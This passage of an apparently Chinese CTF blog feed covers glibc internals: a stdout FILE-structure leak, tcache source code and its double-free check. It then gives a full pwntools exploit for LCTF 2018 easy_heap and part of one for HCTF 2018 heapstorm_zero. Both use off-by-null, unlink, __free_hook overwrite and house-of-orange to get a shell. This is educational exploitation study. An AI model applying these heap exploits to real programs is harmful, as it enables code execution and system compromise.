== EOF) // 攻击者想到执行到的代码位置 return _IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base); //...&#125;libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow) 从代码中可以看出，如果想要执行return _IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);并尽可能减少其他不必要的代码执行，就需要满足下列三个条件： f-&gt;_flags &amp; _IO_NO_WRITES == 0 (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) != 0 f-&gt;_IO_write_base != 0 下面来看_IO_do_write函数： 123456789101112131415161718192021222324252627282930313233343536373839404142// from fileops.c in glibcint _IO_new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)&#123; // 实际调用new_do_write函数 return (to_do == 0 || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;&#125;libc_hidden_ver (_IO_new_do_write, _IO_do_write)static _IO_size_t new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)&#123; _IO_size_t count; if (fp-&gt;_flags &amp; _IO_IS_APPENDING) //需要使这个if成立 /* On a system without a proper O_APPEND implementation, you would need to sys_seek(0, SEEK_END) here, but is not needed nor desirable for Unix- or Posix-like systems. Instead, just indicate that offset (before and after) is unpredictable. */ fp-&gt;_offset = _IO_pos_BAD; else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base) &#123; //fp-&gt;_IO_write_base - fp-&gt;_IO_read_end非常大，如果read被置为0 _IO_off64_t new_pos = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1); if (new_pos == _IO_pos_BAD) return 0; fp-&gt;_offset = new_pos; &#125; // fp=stdout data=stdout-&gt;_IO_write_base to_do=f-&gt;_IO_write_ptr - f-&gt;_IO_write_base count = _IO_SYSWRITE (fp, data, to_do); if (fp-&gt;_cur_column &amp;&amp; count) fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - 1, data, count) + 1; _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base); // 重置write的指针 fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base; fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= 0 &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED)) ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end); return count;&#125; 所以需要满足下列四个条件： f-&gt;_flags &amp; _IO_NO_WRITES == 0 (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) != 0 f-&gt;_IO_write_base != 0 fp-&gt;_flags &amp; _IO_IS_APPENDING != 0 进而能够调用_IO_SYSWRITE (fp, data, to_do)即 1_IO_SYSWRITE (stdout, stdout-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) 所以需要将flag设置为： 1234_flags = 0xfbad0000 // Magic number_flags &amp; = ~_IO_NO_WRITES // _flags = 0xfbad0000_flags | = _IO_CURRENTLY_PUTTING // _flags = 0xfbad0800_flags | = _IO_IS_APPENDING // _flags = 0xfbad1800 参考文章： https://vigneshsrao.github.io/babytcache/ http://tacxingxing.com/2018/02/09/fsp/]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>file</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Play With Tcache & LCTF 2018 easy_heap]]></title>
    <url>%2F2018%2F11%2F22%2Fplay-with-tcache%2F</url>
    <content type="text"><![CDATA[tcache简介tcache是在libc 2.27中加入的chunk快速缓存机制。在malloc.c中有如下定义： 共有64个tcache bin。 使用tidx2usize(idx)对tcache的chunk进行大小计算。 每个tcache bin最多存有TCACHE_FILL_COUNT个chunk（默认为7）。 从代码中也可以看出，tcache是线程独立的，每一个线程拥有自己的tcache_perthread_struct结构体，该结构体记录每一个bin的入口和每一个bin中被放入的chunk的数量。 1234567891011121314151617181920212223242526/* We want 64 entries. This is an arbitrary limit, which tunables can reduce. */# define TCACHE_MAX_BINS 64# define MAX_TCACHE_SIZE tidx2usize (TCACHE_MAX_BINS-1)/* Only used to pre-fill the tunables. */# define tidx2usize(idx) (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)/* This is another arbitrary limit, which tunables can change. Each tcache bin will hold at most this number of chunks. */# define TCACHE_FILL_COUNT 7typedef struct tcache_entry&#123; struct tcache_entry *next;&#125; tcache_entry;/* There is one of these for each thread, which contains the per-thread cache (hence "tcache_perthread_struct"). Keeping overall size low is mildly important. Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons. */typedef struct tcache_perthread_struct&#123; char counts[TCACHE_MAX_BINS]; tcache_entry *entries[TCACHE_MAX_BINS];&#125; tcache_perthread_struct; tcache的操作libc中存取tcache中的chunk主要通过tcache_put和tcache_get两个函数实现。在malloc()和free()的本体和马甲中，均有tcache_put和tcache_get的调用。 tcache_put()1234567891011121314151617// malloc.c:2923/* Caller must ensure that we know tc_idx is valid and there's room for more chunks. */static __always_inline voidtcache_put (mchunkptr chunk, size_t tc_idx)&#123; // 获取chunk用于保存内容的地址，进行强制类型转换 tcache_entry *e = (tcache_entry *) chunk2mem (chunk); // 对于idx的安全检查 assert (tc_idx &lt; TCACHE_MAX_BINS); // next指针指向对应bin中的第一个chunk e-&gt;next = tcache-&gt;entries[tc_idx]; // 插入对应bin中的第一个地址 tcache-&gt;entries[tc_idx] = e; // 计数加1 ++(tcache-&gt;counts[tc_idx]);&#125; tcache_get()1234567891011121314151617/* Caller must ensure that we know tc_idx is valid and there's available chunks to remove. */static __always_inline void *tcache_get (size_t tc_idx)&#123; // 获取相应的bin tcache_entry *e = tcache-&gt;entries[tc_idx]; // 对于idx的安全检查 assert (tc_idx &lt; TCACHE_MAX_BINS); // 检测bin是否为空 assert (tcache-&gt;entries[tc_idx] &gt; 0); // 获得chunk tcache-&gt;entries[tc_idx] = e-&gt;next; // 计数减1 --(tcache-&gt;counts[tc_idx]); return (void *) e;&#125; __libc_malloc()1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#define checked_request2size(req, sz) \(&#123; \ (sz) = request2size (req); \ if (((sz) &lt; (req)) \ || REQUEST_OUT_OF_RANGE (sz)) \ &#123; \ __set_errno (ENOMEM); \ return 0; \ &#125; \&#125;)void *__libc_malloc (size_t bytes)&#123; mstate ar_ptr; void *victim; void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook); if (__builtin_expect (hook != NULL, 0)) // __malloc_hook check return (*hook)(bytes, RETURN_ADDRESS (0));#if USE_TCACHE /* int_free also calls request2size, be careful to not pad twice. */ size_t tbytes; // 转换为tbytes checked_request2size (bytes, tbytes); size_t tc_idx = csize2tidx (tbytes); // 计算tcache index MAYBE_INIT_TCACHE (); DIAG_PUSH_NEEDS_COMMENT; if (tc_idx &lt; mp_.tcache_bins /*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */ &amp;&amp; tcache &amp;&amp; tcache-&gt;entries[tc_idx] != NULL) // idx安全检查，且对应bin非空 &#123; return tcache_get (tc_idx); // 调用tcache_get() &#125; DIAG_POP_NEEDS_COMMENT;#endif if (SINGLE_THREAD_P) &#123; victim = _int_malloc (&amp;main_arena, bytes); assert (!victim || chunk_is_mmapped (mem2chunk (victim)) || &amp;main_arena == arena_for_chunk (mem2chunk (victim))); return victim; &#125; arena_get (ar_ptr, bytes); // 否则调用_int_malloc victim = _int_malloc (ar_ptr, bytes); /* Retry with another arena only if we were able to find a usable arena before. */ if (!victim &amp;&amp; ar_ptr != NULL) &#123; LIBC_PROBE (memory_malloc_retry, 1, bytes); ar_ptr = arena_get_retry (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); &#125; if (ar_ptr != NULL) __libc_lock_unlock (ar_ptr-&gt;mutex); assert (!victim || chunk_is_mmapped (mem2chunk (victim)) || ar_ptr == arena_for_chunk (mem2chunk (victim))); return victim;&#125; __libc_free()123456789101112131415161718192021222324252627282930313233343536373839404142void__libc_free (void *mem)&#123; mstate ar_ptr; mchunkptr p; /* chunk corresponding to mem */ void (*hook) (void *, const void *) = atomic_forced_read (__free_hook); if (__builtin_expect (hook != NULL, 0)) // __free_hook check &#123; (*hook)(mem, RETURN_ADDRESS (0)); return; &#125; if (mem == 0) /* free(0) has no effect */ return; p = mem2chunk (mem); // 获取chunk的指针 if (chunk_is_mmapped (p)) /* release mmapped memory. */ &#123; /* See if the dynamic brk/mmap threshold needs adjusting. Dumped fake mmapped chunks do not affect the threshold. */ if (!mp_.no_dyn_threshold &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (p)) &#123; mp_.mmap_threshold = chunksize (p); mp_.trim_threshold = 2 * mp_.mmap_threshold; LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2, mp_.mmap_threshold, mp_.trim_threshold); &#125; munmap_chunk (p); return; &#125; MAYBE_INIT_TCACHE (); // 初始化tcache ar_ptr = arena_for_chunk (p); _int_free (ar_ptr, p, 0); // real free&#125; _int_malloc()fastbin123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051// malloc.c:3581 if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ())) &#123; // 如果申请的chunk大小在fasbin的范围内 idx = fastbin_index (nb); // 计算fastbin的idx mfastbinptr *fb = &amp;fastbin (av, idx); // 获取对应的fastbin mchunkptr pp; victim = *fb; // 命中的chunk if (victim != NULL) // 如果对应的fastbin中有chunk &#123; if (SINGLE_THREAD_P) *fb = victim-&gt;fd; // 取出bin第一个chunk else REMOVE_FB (fb, pp, victim); // 从多线程中移除一个fastbin chunk if (__glibc_likely (victim != NULL)) // 如果命中fastbin chunk &#123; size_t victim_idx = fastbin_index (chunksize (victim)); if (__builtin_expect (victim_idx != idx, 0)) // idx安全检查 malloc_printerr ("malloc(): memory corruption (fast)"); check_remalloced_chunk (av, victim, nb);#if USE_TCACHE /* While we're here, if we see other chunks of the same size, stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); // 将命中的大小的fastbin的剩余chunk放入tcache中（如果对应的tcache还没满） if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = *fb) != NULL) &#123; if (SINGLE_THREAD_P) *fb = tc_victim-&gt;fd; else &#123; REMOVE_FB (fb, pp, tc_victim); if (__glibc_unlikely (tc_victim == NULL)) break; &#125; tcache_put (tc_victim, tc_idx); // 放入tcache &#125; &#125;#endif void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; &#125; small bin1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#define first(b) ((b)-&gt;fd)#define last(b) ((b)-&gt;bk) /* If a small request, check regular bin. Since these "smallbins" hold one size each, no searching within bins is necessary. (For a large request, we need to wait until unsorted chunks are processed to find best fit. But for small ones, fits are exact anyway, so we can check now, which is faster.) */ if (in_smallbin_range (nb)) // 如果在smallbin的范围内 &#123; idx = smallbin_index (nb); // 获取smallbin index bin = bin_at (av, idx); // 获取smallbin if ((victim = last (bin)) != bin) // 检查是否有chunk &#123; bck = victim-&gt;bk; if (__glibc_unlikely (bck-&gt;fd != victim)) // 检查链表，victiom-&gt;bk-&gt;fd与victim malloc_printerr ("malloc(): smallbin double linked list corrupted"); set_inuse_bit_at_offset (victim, nb); bin-&gt;bk = bck; bck-&gt;fd = bin; // 取出victim if (av != &amp;main_arena) set_non_main_arena (victim); check_malloced_chunk (av, victim, nb);#if USE_TCACHE /* While we're here, if we see other chunks of the same size, stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks over. */ // 将命中的大小的smallbin的剩余chunk放入tcache中（如果对应的tcache还没满） while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last (bin)) != bin) &#123; if (tc_victim != 0) &#123; bck = tc_victim-&gt;bk; set_inuse_bit_at_offset (tc_victim, nb); // 没有安全检查 if (av != &amp;main_arena) set_non_main_arena (tc_victim); bin-&gt;bk = bck; bck-&gt;fd = bin; // 取出victim tcache_put (tc_victim, tc_idx); // 放入tcache &#125; &#125; &#125;#endif void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; /* If this is a large request, consolidate fastbins before continuing. While it might look excessive to kill all fastbins before even seeing if there is space available, this avoids fragmentation problems normally associated with fastbins. Also, in practice, programs tend to have runs of either small or large requests, but less often mixtures, so consolidation is not invoked all that often in most programs. And the programs that it is called frequently in otherwise tend to fragment. */ else // 如果不在small bin的范围内 &#123; idx = largebin_index (nb); if (atomic_load_relaxed (&amp;av-&gt;have_fastchunks)) malloc_consolidate (av); &#125; unsorted bin123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193 /* Process recently freed or remaindered chunks, taking one only if it is exact fit, or, if this a small request, the chunk is remainder from the most recent non-exact fit. Place other traversed chunks in bins. Note that this step is the only place in any routine where chunks are placed in bins. The outer loop here is needed because we might not realize until near the end of malloc that we should have consolidated, so must do so and retry. This happens at most once, and only when we would otherwise need to expand memory to service a "small" request. */#if USE_TCACHE INTERNAL_SIZE_T tcache_nb = 0; size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) // 如果大小属于tcache范围 tcache_nb = nb; // 赋值tcache_nb int return_cached = 0; tcache_unsorted_count = 0;#endif for (;; ) &#123; int iters = 0; while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) &#123; bck = victim-&gt;bk; // 大小检查 if (__builtin_expect (chunksize_nomask (victim) &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (chunksize_nomask (victim) &gt; av-&gt;system_mem, 0)) malloc_printerr ("malloc(): memory corruption"); size = chunksize (victim); /* If a small request, try to use last remainder if it is the only chunk in unsorted bin. This helps promote locality for runs of consecutive small requests. This is the only exception to best-fit, and applies only when there is no exact fit for a small chunk. */ if (in_smallbin_range (nb) &amp;&amp; bck == unsorted_chunks (av) &amp;&amp; victim == av-&gt;last_remainder &amp;&amp; (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) &#123; /* split and reattach remainder */ remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder; av-&gt;last_remainder = remainder; remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av); if (!in_smallbin_range (remainder_size)) &#123; remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; &#125; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); set_foot (remainder, remainder_size); check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; /* remove from unsorted list */ unsorted_chunks (av)-&gt;bk = bck; bck-&gt;fd = unsorted_chunks (av); /* Take now instead of binning if exact fit */ if (size == nb) // 如果大小正好匹配 &#123; set_inuse_bit_at_offset (victim, size); if (av != &amp;main_arena) set_non_main_arena (victim);#if USE_TCACHE /* Fill cache first, return to user only if cache fills. We may return one of these chunks later. */ if (tcache_nb &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) &#123; tcache_put (victim, tc_idx); // 放入tcache return_cached = 1; continue; &#125; else &#123;#endif check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p;#if USE_TCACHE &#125;#endif &#125; // if (size == nb) /* place chunk in bin */ // 如果大小不相等，则放入相应的bin中 if (in_smallbin_range (size)) &#123; victim_index = smallbin_index (size); bck = bin_at (av, victim_index); fwd = bck-&gt;fd; &#125; else &#123; victim_index = largebin_index (size); bck = bin_at (av, victim_index); fwd = bck-&gt;fd; /* maintain large bins in sorted order */ if (fwd != bck) &#123; /* Or with inuse bit to speed comparisons */ size |= PREV_INUSE; /* if smaller than smallest, bypass loop below */ assert (chunk_main_arena (bck-&gt;bk)); if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk)) &#123; fwd = bck; bck = bck-&gt;bk; victim-&gt;fd_nextsize = fwd-&gt;fd; victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; &#125; else &#123; assert (chunk_main_arena (fwd)); while ((unsigned long) size &lt; chunksize_nomask (fwd)) &#123; fwd = fwd-&gt;fd_nextsize; assert (chunk_main_arena (fwd)); &#125; if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd)) /* Always insert in the second position. */ fwd = fwd-&gt;fd; else &#123; victim-&gt;fd_nextsize = fwd; victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; fwd-&gt;bk_nextsize = victim; victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; &#125; bck = fwd-&gt;bk; &#125; &#125; else victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim; &#125; mark_bin (av, victim_index); victim-&gt;bk = bck; victim-&gt;fd = fwd; fwd-&gt;bk = victim; bck-&gt;fd = victim;#if USE_TCACHE /* If we've processed as many chunks as we're allowed while filling the cache, return one of the cached ones. */ ++tcache_unsorted_count; if (return_cached &amp;&amp; mp_.tcache_unsorted_limit &gt; 0 /* tcache_unsorted_limit默认0，unlimit */ &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit) &#123; return tcache_get (tc_idx); // 从tcache中返回chunk &#125;#endif#define MAX_ITERS 10000 if (++iters &gt;= MAX_ITERS) break; &#125;#if USE_TCACHE /* If all the small chunks we found ended up cached, return one now. */ if (return_cached) // 有完全匹配的chunk放入tcache后return_cached才会True &#123; return tcache_get (tc_idx); &#125;#endif _int_free()1234567891011121314// malloc.c:4165 _int_free()的最前部位置#if USE_TCACHE &#123; size_t tc_idx = csize2tidx (size); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) // idx合法，bin仍有空间 &#123; tcache_put (p, tc_idx); // 放入tcache return; &#125; &#125;#endif Double Free Check昨天听说glibc的git上增加了一个Tcache Double Free的check的commit，就去看了下。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758--- a/malloc/malloc.c+++ b/malloc/malloc.c@@ -2967,6 +2967,8 @@ mremap_chunk (mchunkptr p, size_t new_size) typedef struct tcache_entry &#123; struct tcache_entry *next;+ /* This field exists to detect double frees. */+ struct tcache_perthread_struct *key; &#125; tcache_entry; /* There is one of these for each thread, which contains the@@ -2990,6 +2992,11 @@ tcache_put (mchunkptr chunk, size_t tc_idx) &#123; tcache_entry *e = (tcache_entry *) chunk2mem (chunk); assert (tc_idx &lt; TCACHE_MAX_BINS);++ /* Mark this chunk as "in the tcache" so the test in _int_free will+ detect a double free. */+ e-&gt;key = tcache;+ e-&gt;next = tcache-&gt;entries[tc_idx]; tcache-&gt;entries[tc_idx] = e; ++(tcache-&gt;counts[tc_idx]);@@ -3005,6 +3012,7 @@ tcache_get (size_t tc_idx) assert (tcache-&gt;entries[tc_idx] &gt; 0); tcache-&gt;entries[tc_idx] = e-&gt;next; --(tcache-&gt;counts[tc_idx]);+ e-&gt;key = NULL; return (void *) e; &#125; @@ -4218,6 +4226,26 @@ _int_free (mstate av, mchunkptr p, int have_lock) &#123; size_t tc_idx = csize2tidx (size); + /* Check to see if it's already in the tcache. */+ tcache_entry *e = (tcache_entry *) chunk2mem (p);++ /* This test succeeds on double free. However, we don't 100%+ trust it (it also matches random payload data at a 1 in+ 2^&lt;size_t&gt; chance), so verify it's not an unlikely coincidence+ before aborting. */+ if (__glibc_unlikely (e-&gt;key == tcache &amp;&amp; tcache))+ &#123;+ tcache_entry *tmp;+ LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);+ for (tmp = tcache-&gt;entries[tc_idx];+ tmp;+ tmp = tmp-&gt;next)+ if (tmp == e)+ malloc_printerr ("free(): double free detected in tcache 2");+ /* If we get here, it was a coincidence. We've wasted a few+ cycles, but don't abort. */+ &#125;+ if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) 在tcache_entry结构体中增加了key变量用于防止double free。 123456typedef struct tcache_entry&#123; struct tcache_entry *next; /* This field exists to detect double frees. */ struct tcache_perthread_struct *key;&#125; tcache_entry; 在tcache_put()中，key会被赋值为tcache，在tcache_get()中key会被置为NULL。 12345678910111213141516171819@@ -2990,6 +2992,11 @@ tcache_put (mchunkptr chunk, size_t tc_idx) &#123; tcache_entry *e = (tcache_entry *) chunk2mem (chunk); assert (tc_idx &lt; TCACHE_MAX_BINS);++ /* Mark this chunk as "in the tcache" so the test in _int_free will+ detect a double free. */+ e-&gt;key = tcache;+ e-&gt;next = tcache-&gt;entries[tc_idx]; tcache-&gt;entries[tc_idx] = e; ++(tcache-&gt;counts[tc_idx]);@@ -3005,6 +3012,7 @@ tcache_get (size_t tc_idx) assert (tcache-&gt;entries[tc_idx] &gt; 0); tcache-&gt;entries[tc_idx] = e-&gt;next; --(tcache-&gt;counts[tc_idx]);+ e-&gt;key = NULL; return (void *) e; &#125; doubule free的check主要是在_int_free()中，如果key的值为tcache，就会对相应的tcache bin进行遍历（防止误伤，如果该chunk的key正好为tcache），如果找到相应的chunk，则报错。 123456789101112131415161718192021222324252627@@ -4218,6 +4226,26 @@ _int_free (mstate av, mchunkptr p, int have_lock) &#123; size_t tc_idx = csize2tidx (size); + /* Check to see if it's already in the tcache. */+ tcache_entry *e = (tcache_entry *) chunk2mem (p);++ /* This test succeeds on double free. However, we don't 100%+ trust it (it also matches random payload data at a 1 in+ 2^&lt;size_t&gt; chance), so verify it's not an unlikely coincidence+ before aborting. */+ if (__glibc_unlikely (e-&gt;key == tcache &amp;&amp; tcache))+ &#123;+ tcache_entry *tmp;+ LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);+ for (tmp = tcache-&gt;entries[tc_idx];+ tmp;+ tmp = tmp-&gt;next)+ if (tmp == e)+ malloc_printerr ("free(): double free detected in tcache 2");+ /* If we get here, it was a coincidence. We've wasted a few+ cycles, but don't abort. */+ &#125;+ if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) LCTF 2018 easy_heap才疏学浅，比赛的时候没做出来，又复习了一遍tcache。 当malloc()时，申请的大小正好与unsorted bin中的chunk大小一致时，会被放入tcache。由于tcache只利用前8字节保存链表信息，因此从unsorted bin中被放入tcache的chunk的bk的值仍然被保留。 利用堆块中残留的bk指针的信息，进行unlink攻击（本题构造的也很巧妙，使得写入\x00后，能够将指针地址指回chunk的头部）。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687# coding=utf-8# 参考Nu1L writeup：https://xz.aliyun.com/t/3341from pwn import *def Add(p, size, content): p.sendlineafter('&gt; ', str(1)) p.sendlineafter('&gt; ', str(size)) p.sendlineafter('&gt; ', content)def Delete(p, idx): p.sendlineafter('&gt; ', str(2)) p.sendlineafter('&gt; ', str(idx))def Show(p, idx): p.sendlineafter('&gt; ', str(3)) p.sendlineafter('&gt; ', str(idx))def pwn(): BIN_PATH = './easy_heap' DEBUG = 1 context.arch = 'amd64' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: pass for i in range(10): Add(p, 0x20, 'sunichi') Delete(p, 1) for i in range(3, 8): Delete(p, i) Delete(p, 9) Delete(p, 8) Delete(p, 2) Delete(p, 0) for i in range(7): Add(p, 0x20, 'sunichi') p.sendlineafter('&gt; ', str(1)) p.sendlineafter('&gt; ', str(0)) p.sendafter('&gt; ', '') # change lowest byte of chunk address to 0x00 Add(p, 0xf8, '') # off by null byte to let itself can be unlink for i in range(0, 5): Delete(p, i) Delete(p, 6) Delete(p, 5) # trigger unlink Show(p, 8) recv = p.recvuntil('\n', drop=True) + '\x00\x00' libc.address = u64(recv) - (0x7ffff7dcfca0 - 0x7ffff79e4000) print hex(libc.address) for i in range(7): Add(p, 0x20, 'sunichi') Add(p, 0x20, 'sunichi') Delete(p, 0) Delete(p, 8) Delete(p, 1) Delete(p, 9) Add(p, 0x20, p64(libc.symbols['__free_hook'])[:6]) Add(p, 0x20, 'sunichi') Add(p, 0x20, 'sunichi') Add(p, 0x20, p64(libc.address + 0x4f322)[:6]) Delete(p, 1) p.interactive() p.close()if __name__ == '__main__': pwn()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
        <tag>2018</tag>
        <tag>lctf</tag>
        <tag>tcache</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hctf 2018 heapstorm_zero]]></title>
    <url>%2F2018%2F11%2F21%2Fhctf18-heapstorm%2F</url>
    <content type="text"><![CDATA[本题的关键主要在于通过scanf()调用malloc()申请一个large bin从而触发fastbin的合并获取unsorted bin。当获得了unsorted bin后，就是常规的off by null和house of orange题了。 本题另一麻烦的地方就是在做house of orange时修改unsorted bin的size，需要利用chunk的重叠来实现（在off by null和unlink时，会产生能够利用的指针）。感觉还是tcl，exp写了140行。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146# coding=utf-8from pwn import *def Allocate(p, size, content): p.sendlineafter('Choice:', str(1)) p.sendlineafter('size:', str(size)) p.sendafter('content:', content)def Show(p, idx): p.sendlineafter('Choice:', str(2)) p.sendlineafter('index:', str(idx))def Delete(p, idx): p.sendlineafter('Choice:', str(3)) p.sendlineafter('index: ', str(idx))def pwn(): BIN_PATH = './heapstorm_zero' DEBUG = 1 context.arch = 'amd64' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') for i in range(0x19): if i == 7: Allocate(p, 0x33, '\x00' * 0x30 + '\x00\x01\n') elif i == 15: Allocate(p, 0x10, '\n') else: Allocate(p, 0x30, '\n') Allocate(p, 0x10, '\n') Allocate(p, 0x20, '\n') Allocate(p, 0x30, '\n') for i in range(4, 9): Delete(p, i) # 4 5 6 7 8 p.sendline('1' * 0x500) p.recvuntil('Invaild choice!\n') Delete(p, 3) # 3 payload = 'a' * 0x38 Allocate(p, 0x38, payload) # 3 Allocate(p, 0x20, '\n') # 4 Allocate(p, 0x20, '\n') # 5 Allocate(p, 0x20, '\n') # 6 Delete(p, 4) Delete(p, 9) p.sendline('1' * 0x500) p.recvuntil('Invaild choice!\n') Allocate(p, 0x20, '\n') Allocate(p, 0x30, '\n') Allocate(p, 0x20, '\n') Allocate(p, 0x20, '\n') Show(p, 6) p.recvuntil('Content: ') recv = p.recv(6) libc.address = u64(recv + '\x00\x00') - (0x7ffff7dd1b78 - 0x7ffff7a0d000) for i in range(0x15, 0x15+6): Delete(p, i) p.sendline('1' * 0x500) p.recvuntil('Invaild choice!\n') Delete(p, 9) p.sendline('1' * 0x500) p.recvuntil('Invaild choice!\n') Show(p, 5) p.recvuntil('Content: ') recv = p.recv(6) heap_chunk_base = u64(recv + '\x00\x00') - 0x540 Allocate(p, 0x20, '\n') Delete(p, 27) for i in range(11, 21): Delete(p, i) for i in range(0, 4): Delete(p, i) Delete(p, 8) Delete(p, 9) Delete(p, 10) p.sendline('1' * 0x500) p.recvuntil('Invaild choice!\n') # clear the chunk # Attack for i in range(0, 5): Allocate(p, 0x37, 'sunichi\n') Allocate(p, 0x10, 'sunichi\n') for i in range(10): Allocate(p, 0x37, 'sunichi\n') for i in range(0, 4): Delete(p, i) Delete(p, 8) Delete(p, 9) Delete(p, 10) # 10 -&gt; fake file structure Allocate(p, 0x37, 'sunichi!\x31\n') # 10 p.sendline('1' * 0x500) p.recvuntil('Invaild choice!\n') # get unsorted bin # make 0x60 unsorted bin for i in range(4): Allocate(p, 0x37, 'sunichi\n') payload = p64(0) * 4 + p64(0) + p64(0x41) Allocate(p, 0x37, payload + '\n') Delete(p, 5) payload = '/bin/sh\x00' + p64(0x61) payload += p64(libc.address + (0x7ffff7dd1b20 - 0x7ffff7a0d000)) + p64(libc.symbols['_IO_list_all'] - 0x10) payload += p64(0x20) + p64(0x40) Allocate(p, 0x37, payload + '\n') Delete(p, 0) Allocate(p, 0x37, '\x00' * 0x37 + '\n') Delete(p, 11) Allocate(p, 0x37, '\x00' * 0x37 + '\n') Delete(p, 12) payload = 